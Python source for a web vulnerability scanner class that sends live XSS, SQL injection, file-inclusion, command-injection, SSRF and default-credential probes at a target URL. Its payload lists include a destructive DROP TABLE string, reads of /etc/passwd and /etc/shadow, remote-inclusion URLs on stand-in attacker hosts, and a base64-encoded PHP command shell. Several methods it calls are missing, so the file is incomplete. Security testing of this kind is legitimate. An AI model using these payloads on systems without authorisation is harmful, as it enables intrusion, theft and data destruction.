# Enhanced Security Testing Agent
"""
Advanced security testing capabilities with specialized attack modules
"""

import asyncio
import aiohttp
import requests
import json
import re
import ssl
import socket
import subprocess
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Tuple, Optional
import logging
import base64
import hashlib
import time
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

class EnhancedSecurityAgent:
    """Enhanced security testing with advanced vulnerability detection"""
    
    def __init__(self):
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(verify_ssl=False)
        )
        
        # Advanced payloads for different vulnerability types
        self.payloads = {
            'xss': self._load_xss_payloads(),
            'sql_injection': self._load_sql_payloads(),
            'lfi': self._load_lfi_payloads(),
            'rfi': self._load_rfi_payloads(),
            'xxe': self._load_xxe_payloads(),
            'ssrf': self._load_ssrf_payloads(),
            'command_injection': self._load_command_payloads(),
            'ldap_injection': self._load_ldap_payloads(),
            'xpath_injection': self._load_xpath_payloads()
        }
        
        # WAF detection signatures
        self.waf_signatures = self._load_waf_signatures()
        
        # Rate limiting
        self.request_delay = 0.5  # seconds between requests
        self.concurrent_limit = 5  # max concurrent requests
        
    async def comprehensive_security_scan(self, target_url: str, scan_config: Dict = None) -> List[Dict]:
        """Perform comprehensive security testing"""
        
        vulnerabilities = []
        scan_config = scan_config or {}
        
        logging.info(f"Starting enhanced security scan for {target_url}")
        
        # 1. Initial reconnaissance
        recon_data = await self._perform_reconnaissance(target_url)
        
        # 2. Technology detection
        tech_stack = await self._detect_technology_stack(target_url, recon_data)
        
        # 3. WAF detection
        waf_info = await self._detect_waf(target_url)
        
        # 4. SSL/TLS analysis
        ssl_vulns = await self._analyze_ssl_configuration(target_url)
        vulnerabilities.extend(ssl_vulns)
        
        # 5. Web application testing
        web_vulns = await self._test_web_vulnerabilities(target_url, recon_data)
        vulnerabilities.extend(web_vulns)
        
        # 6. API security testing
        api_vulns = await self._test_api_security(target_url, recon_data)
        vulnerabilities.extend(api_vulns)
        
        # 7. Authentication testing
        auth_vulns = await self._test_authentication(target_url, recon_data)
        vulnerabilities.extend(auth_vulns)
        
        # 8. Session management testing
        session_vulns = await self._test_session_management(target_url)
        vulnerabilities.extend(session_vulns)
        
        # 9. Business logic testing
        logic_vulns = await self._test_business_logic(target_url, recon_data)
        vulnerabilities.extend(logic_vulns)
        
        # 10. Advanced attack vectors
        advanced_vulns = await self._test_advanced_attacks(target_url, tech_stack)
        vulnerabilities.extend(advanced_vulns)
        
        logging.info(f"Enhanced scan completed. Found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities
    
    async def _perform_reconnaissance(self, target_url: str) -> Dict:
        """Enhanced reconnaissance and information gathering"""
        
        recon_data = {
            'forms': [],
            'links': [],
            'inputs': [],
            'cookies': [],
            'headers': {},
            'technologies': [],
            'endpoints': [],
            'subdomains': []
        }
        
        try:
            async with self.session.get(target_url) as response:
                content = await response.text()
                headers = dict(response.headers)
                
                recon_data['headers'] = headers
                recon_data['status_code'] = response.status
                
                # Parse HTML content
                soup = BeautifulSoup(content, 'html.parser')
                
                # Find forms
                forms = soup.find_all('form')
                for form in forms:
                    form_data = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for inp in inputs:
                        form_data['inputs'].append({
                            'name': inp.get('name', ''),
                            'type': inp.get('type', 'text'),
                            'value': inp.get('value', '')
                        })
                    
                    recon_data['forms'].append(form_data)
                
                # Find all links
                links = soup.find_all('a', href=True)
                for link in links:
                    href = link['href']
                    if href.startswith('http') or href.startswith('/'):
                        recon_data['links'].append(urljoin(target_url, href))
                
                # Find input fields outside forms
                inputs = soup.find_all(['input', 'textarea'])
                for inp in inputs:
                    recon_data['inputs'].append({
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'id': inp.get('id', '')
                    })
                
                # Extract cookies
                if 'Set-Cookie' in headers:
                    cookies = headers['Set-Cookie'].split(',')
                    for cookie in cookies:
                        recon_data['cookies'].append(cookie.strip())
        
        except Exception as e:
            logging.error(f"Reconnaissance failed: {e}")
        
        # Additional endpoint discovery
        recon_data['endpoints'] = await self._discover_endpoints(target_url)
        
        # Subdomain enumeration
        recon_data['subdomains'] = await self._enumerate_subdomains(target_url)
        
        return recon_data
    
    async def _test_web_vulnerabilities(self, target_url: str, recon_data: Dict) -> List[Dict]:
        """Test for common web vulnerabilities"""
        
        vulnerabilities = []
        
        # Test each form for vulnerabilities
        for form in recon_data.get('forms', []):
            # XSS testing
            xss_vulns = await self._test_xss_in_form(target_url, form)
            vulnerabilities.extend(xss_vulns)
            
            # SQL injection testing
            sql_vulns = await self._test_sql_injection_in_form(target_url, form)
            vulnerabilities.extend(sql_vulns)
            
            # Command injection testing
            cmd_vulns = await self._test_command_injection_in_form(target_url, form)
            vulnerabilities.extend(cmd_vulns)
        
        # Test URL parameters
        param_vulns = await self._test_url_parameters(target_url, recon_data)
        vulnerabilities.extend(param_vulns)
        
        # Directory traversal testing
        dt_vulns = await self._test_directory_traversal(target_url)
        vulnerabilities.extend(dt_vulns)
        
        # File upload testing
        upload_vulns = await self._test_file_upload(target_url, recon_data)
        vulnerabilities.extend(upload_vulns)
        
        return vulnerabilities
    
    async def _test_xss_in_form(self, target_url: str, form: Dict) -> List[Dict]:
        """Test for XSS vulnerabilities in forms"""
        
        vulnerabilities = []
        form_action = urljoin(target_url, form.get('action', ''))
        method = form.get('method', 'GET')
        
        for payload in self.payloads['xss']:
            try:
                # Prepare form data with XSS payload
                form_data = {}
                for inp in form.get('inputs', []):
                    field_name = inp.get('name', '')
                    if field_name:
                        form_data[field_name] = payload
                
                # Submit form
                if method == 'POST':
                    async with self.session.post(form_action, data=form_data) as response:
                        content = await response.text()
                else:
                    async with self.session.get(form_action, params=form_data) as response:
                        content = await response.text()
                
                # Check if payload is reflected without encoding
                if payload in content and not self._is_payload_encoded(payload, content):
                    vulnerabilities.append({
                        'title': 'Cross-Site Scripting (XSS)',
                        'severity': 'High',
                        'cvss': 7.5,
                        'description': f'XSS vulnerability found in form at {form_action}',
                        'url': form_action,
                        'parameter': list(form_data.keys())[0] if form_data else '',
                        'payload': payload,
                        'remediation': 'Implement proper input validation and output encoding',
                        'discoveredBy': 'Enhanced Security Agent',
                        'evidence': content[:500] + '...' if len(content) > 500 else content
                    })
                    break  # Found XSS, move to next form
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logging.error(f"XSS testing error: {e}")
        
        return vulnerabilities
    
    async def _test_sql_injection_in_form(self, target_url: str, form: Dict) -> List[Dict]:
        """Test for SQL injection vulnerabilities in forms"""
        
        vulnerabilities = []
        form_action = urljoin(target_url, form.get('action', ''))
        method = form.get('method', 'GET')
        
        for payload in self.payloads['sql_injection']:
            try:
                # Prepare form data with SQL injection payload
                form_data = {}
                for inp in form.get('inputs', []):
                    field_name = inp.get('name', '')
                    if field_name and inp.get('type') != 'submit':
                        form_data[field_name] = payload
                
                # Submit form
                start_time = time.time()
                if method == 'POST':
                    async with self.session.post(form_action, data=form_data) as response:
                        content = await response.text()
                        status_code = response.status
                else:
                    async with self.session.get(form_action, params=form_data) as response:
                        content = await response.text()
                        status_code = response.status
                
                response_time = time.time() - start_time
                
                # Check for SQL error messages
                sql_errors = [
                    'mysql_fetch_array',
                    'ora-01756',
                    'microsoft ole db provider',
                    'unclosed quotation mark',
                    'syntax error',
                    'mysql_num_rows',
                    'postgresql query failed',
                    'warning: sqlite_'
                ]
                
                content_lower = content.lower()
                for error in sql_errors:
                    if error in content_lower:
                        vulnerabilities.append({
                            'title': 'SQL Injection',
                            'severity': 'Critical',
                            'cvss': 9.0,
                            'description': f'SQL injection vulnerability found in form at {form_action}',
                            'url': form_action,
                            'parameter': list(form_data.keys())[0] if form_data else '',
                            'payload': payload,
                            'remediation': 'Use parameterized queries and proper input validation',
                            'discoveredBy': 'Enhanced Security Agent',
                            'evidence': f'SQL error detected: {error}'
                        })
                        break
                
                # Check for time-based SQL injection
                if response_time > 5 and 'sleep' in payload.lower():
                    vulnerabilities.append({
                        'title': 'Time-based SQL Injection',
                        'severity': 'Critical',
                        'cvss': 9.0,
                        'description': f'Time-based SQL injection vulnerability found in form at {form_action}',
                        'url': form_action,
                        'parameter': list(form_data.keys())[0] if form_data else '',
                        'payload': payload,
                        'remediation': 'Use parameterized queries and proper input validation',
                        'discoveredBy': 'Enhanced Security Agent',
                        'evidence': f'Response time: {response_time:.2f} seconds'
                    })
                
                await asyncio.sleep(self.request_delay)
                
            except Exception as e:
                logging.error(f"SQL injection testing error: {e}")
        
        return vulnerabilities
    
    async def _analyze_ssl_configuration(self, target_url: str) -> List[Dict]:
        """Analyze SSL/TLS configuration for vulnerabilities"""
        
        vulnerabilities = []
        parsed_url = urlparse(target_url)
        
        if parsed_url.scheme != 'https':
            vulnerabilities.append({
                'title': 'Unencrypted HTTP Connection',
                'severity': 'High',
                'cvss': 7.4,
                'description': 'Website does not use HTTPS encryption',
                'url': target_url,
                'parameter': '',
                'payload': '',
                'remediation': 'Implement HTTPS with valid SSL certificate',
                'discoveredBy': 'Enhanced Security Agent'
            })
            return vulnerabilities
        
        try:
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Create SSL context for testing
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect and get certificate info
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    # Check certificate expiration
                    not_after = cert.get('notAfter')
                    if not_after:
                        from datetime import datetime
                        expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_until_expiry = (expiry_date - datetime.now()).days
                        
                        if days_until_expiry < 30:
                            vulnerabilities.append({
                                'title': 'SSL Certificate Expiring Soon',
                                'severity': 'Medium',
                                'cvss': 5.3,
                                'description': f'SSL certificate expires in {days_until_expiry} days',
                                'url': target_url,
                                'parameter': '',
                                'payload': '',
                                'remediation': 'Renew SSL certificate before expiration',
                                'discoveredBy': 'Enhanced Security Agent'
                            })
                    
                    # Check for weak protocols
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vulnerabilities.append({
                            'title': 'Weak SSL/TLS Protocol',
                            'severity': 'High',
                            'cvss': 7.4,
                            'description': f'Server supports weak protocol: {version}',
                            'url': target_url,
                            'parameter': '',
                            'payload': '',
                            'remediation': 'Disable weak protocols and use TLS 1.2 or higher',
                            'discoveredBy': 'Enhanced Security Agent'
                        })
                    
                    # Check for weak ciphers
                    if cipher:
                        cipher_name = cipher[0]
                        if any(weak in cipher_name.lower() for weak in ['rc4', 'des', 'md5', 'null']):
                            vulnerabilities.append({
                                'title': 'Weak SSL Cipher Suite',
                                'severity': 'Medium',
                                'cvss': 5.9,
                                'description': f'Server uses weak cipher: {cipher_name}',
                                'url': target_url,
                                'parameter': '',
                                'payload': '',
                                'remediation': 'Configure strong cipher suites only',
                                'discoveredBy': 'Enhanced Security Agent'
                            })
        
        except Exception as e:
            logging.error(f"SSL analysis error: {e}")
        
        return vulnerabilities
    
    async def _test_authentication(self, target_url: str, recon_data: Dict) -> List[Dict]:
        """Test authentication mechanisms for vulnerabilities"""
        
        vulnerabilities = []
        
        # Look for login forms
        login_forms = [form for form in recon_data.get('forms', []) 
                      if any(inp.get('type') == 'password' for inp in form.get('inputs', []))]
        
        for form in login_forms:
            # Test for default credentials
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('test', 'test'),
                ('guest', 'guest')
            ]
            
            for username, password in default_creds:
                if await self._test_login_credentials(target_url, form, username, password):
                    vulnerabilities.append({
                        'title': 'Default Credentials',
                        'severity': 'Critical',
                        'cvss': 9.8,
                        'description': f'Default credentials found: {username}/{password}',
                        'url': urljoin(target_url, form.get('action', '')),
                        'parameter': 'authentication',
                        'payload': f'{username}:{password}',
                        'remediation': 'Change default credentials and implement strong password policy',
                        'discoveredBy': 'Enhanced Security Agent'
                    })
            
            # Test for brute force protection
            brute_force_vuln = await self._test_brute_force_protection(target_url, form)
            if brute_force_vuln:
                vulnerabilities.append(brute_force_vuln)
        
        return vulnerabilities
    
    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads for testing"""
        return [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
            '<marquee onstart=alert("XSS")>',
            '"><img src=x onerror=prompt("XSS")>',
            '\'-alert("XSS")-\'',
            '";alert("XSS");//',
            '</script><script>alert("XSS")</script>',
            '<script>confirm("XSS")</script>'
        ]
    
    def _load_sql_payloads(self) -> List[str]:
        """Load SQL injection payloads for testing"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'#",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR EXISTS(SELECT * FROM users)--",
            "1; DROP TABLE users--"
        ]
    
    def _load_lfi_payloads(self) -> List[str]:
        """Load Local File Inclusion payloads"""
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../proc/version",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "../../../../var/log/apache2/access.log"
        ]
    
    def _load_rfi_payloads(self) -> List[str]:
        """Load Remote File Inclusion payloads"""
        return [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/backdoor.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
        ]
    
    def _load_xxe_payloads(self) -> List[str]:
        """Load XXE injection payloads"""
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><data>&file;</data>'
        ]
    
    def _load_ssrf_payloads(self) -> List[str]:
        """Load SSRF payloads"""
        return [
            "http://127.0.0.1:22",
            "http://localhost:80",
            "http://169.254.169.254/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:80"
        ]
    
    def _load_command_payloads(self) -> List[str]:
        """Load command injection payloads"""
        return [
            "; ls -la",
            "&& dir",
            "| whoami",
            "; cat /etc/passwd",
            "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "`id`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "&& net user"
        ]
    
    def _load_ldap_payloads(self) -> List[str]:
        """Load LDAP injection payloads"""
        return [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00"
        ]
    
    def _load_xpath_payloads(self) -> List[str]:
        """Load XPath injection payloads"""
        return [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "test']|//user/*|//user[username/text()='",
            "' or position()=1 or '1'='1"
        ]
    
    def _load_waf_signatures(self) -> Dict:
        """Load WAF detection signatures"""
        return {
            'cloudflare': ['cf-ray', 'cloudflare', '__cfduid'],
            'akamai': ['akamai', 'ak-bmsc'],
            'aws_waf': ['x-amzn-requestid', 'x-amz-cf-id'],
            'f5_bigip': ['bigipserver', 'f5-bigip'],
            'imperva': ['x-iinfo', 'incap_ses'],
            'sucuri': ['sucuri', 'x-sucuri-id'],
            'wordfence': ['wordfence', 'wfwaf'],
            'mod_security': ['mod_security', 'modsecurity']
        }
    
    async def _detect_waf(self, target_url: str) -> Dict:
        """Detect Web Application Firewall"""
        
        waf_info = {'detected': False, 'type': '', 'confidence': 0}
        
        try:
            # Send a suspicious request to trigger WAF
            malicious_payload = "' OR 1=1--<script>alert('xss')</script>"
            
            async with self.session.get(
                target_url, 
                params={'test': malicious_payload}
            ) as response:
                headers = dict(response.headers)
                content = await response.text()
                
                # Check headers for WAF signatures
                for waf_name, signatures in self.waf_signatures.items():
                    for sig in signatures:
                        if any(sig.lower() in header.lower() for header in headers.keys()):
                            waf_info = {
                                'detected': True,
                                'type': waf_name,
                                'confidence': 0.8
                            }
                            break
                
                # Check response content for WAF messages
                waf_messages = [
                    'access denied',
                    'blocked by administrator',
                    'security violation',
                    'request rejected',
                    'forbidden'
                ]
                
                content_lower = content.lower()
                for msg in waf_messages:
                    if msg in content_lower and response.status in [403, 406, 501, 503]:
                        waf_info['detected'] = True
                        waf_info['confidence'] = max(waf_info['confidence'], 0.6)
        
        except Exception as e:
            logging.error(f"WAF detection error: {e}")
        
        return waf_info
    
    def _is_payload_encoded(self, payload: str, content: str) -> bool:
        """Check if payload is properly encoded in response"""
        
        # Check for HTML encoding
        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        if html_encoded in content:
            return True
        
        # Check for URL encoding
        import urllib.parse
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in content:
            return True
        
        return False
    
    async def _discover_endpoints(self, target_url: str) -> List[str]:
        """Discover additional endpoints through various methods"""
        endpoints = []
        
        try:
            # Try common endpoints
            common_endpoints = [
                '/admin', '/api', '/login', '/register', '/search', '/upload',
                '/config', '/settings', '/profile', '/dashboard', '/status'
            ]
            
            for endpoint in common_endpoints:
                try:
                    test_url = target_url.rstrip('/') + endpoint
                    async with self.session.get(test_url, timeout=5) as response:
                        if response.status == 200:
                            endpoints.append(endpoint)
                        await asyncio.sleep(0.1)  # Rate limiting
                except:
                    pass
                    
        except Exception as e:
            logger.warning(f"Endpoint discovery error: {e}")
            
        return endpoints
    
    async def _enumerate_subdomains(self, target_url: str) -> List[str]:
        """Enumerate subdomains using simple methods"""
        subdomains = []
        
        try:
            from urllib.parse import urlparse
            domain = urlparse(target_url).netloc
            
            # Try common subdomains
            common_subs = ['www', 'api', 'mail', 'ftp', 'admin', 'dev', 'test', 'staging']
            
            for sub in common_subs:
                try:
                    subdomain = f"{sub}.{domain}"
                    # Simple DNS check
                    import socket
                    socket.gethostbyname(subdomain)
                    subdomains.append(subdomain)
                    await asyncio.sleep(0.1)  # Rate limiting
                except:
                    pass
                    
        except Exception as e:
            logger.warning(f"Subdomain enumeration error: {e}")
            
        return subdomains
    
    async def _detect_technology_stack(self, target_url: str, recon_data: Dict) -> List[str]:
        """Detect technology stack of the target"""
        technologies = []
        
        try:
            async with self.session.get(target_url, timeout=10) as response:
                # Check headers for technology indicators
                headers = response.headers
                
                # Server header
                server = headers.get('Server', '').lower()
                if 'apache' in server:
                    technologies.append('Apache')
                elif 'nginx' in server:
                    technologies.append('Nginx')
                elif 'iis' in server:
                    technologies.append('IIS')
                
                # Framework detection
                x_powered_by = headers.get('X-Powered-By', '').lower()
                if 'php' in x_powered_by:
                    technologies.append('PHP')
                elif 'asp.net' in x_powered_by:
                    technologies.append('ASP.NET')
                elif 'express' in x_powered_by:
                    technologies.append('Express.js')
                
                # Content analysis
                content = await response.text()
                content_lower = content.lower()
                
                # CMS detection
                if 'wp-content' in content_lower or 'wordpress' in content_lower:
                    technologies.append('WordPress')
                elif 'joomla' in content_lower:
                    technologies.append('Joomla')
                elif 'drupal' in content_lower:
                    technologies.append('Drupal')
                
                # JavaScript frameworks
                if 'react' in content_lower:
                    technologies.append('React')
                elif 'angular' in content_lower:
                    technologies.append('Angular')
                elif 'vue' in content_lower:
                    technologies.append('Vue.js')
                    
        except Exception as e:
            logger.warning(f"Technology detection error: {e}")
            
        return list(set(technologies))  # Remove duplicates
    
    async def close(self):
        """Close the session"""
        await self.session.close()
    
    def get_agent_status(self) -> Dict:
        """Get enhanced security agent status"""
        return {
            'name': 'Enhanced Security Agent',
            'status': 'active',
            'capabilities': [
                'Advanced XSS Detection',
                'SQL Injection Testing',
                'SSL/TLS Analysis',
                'Authentication Testing',
                'WAF Detection',
                'Command Injection',
                'File Inclusion Testing',
                'Business Logic Testing'
            ],
            'payload_count': sum(len(payloads) for payloads in self.payloads.values()),
            'vulnerability_types': list(self.payloads.keys()),
            'concurrent_limit': self.concurrent_limit
        }
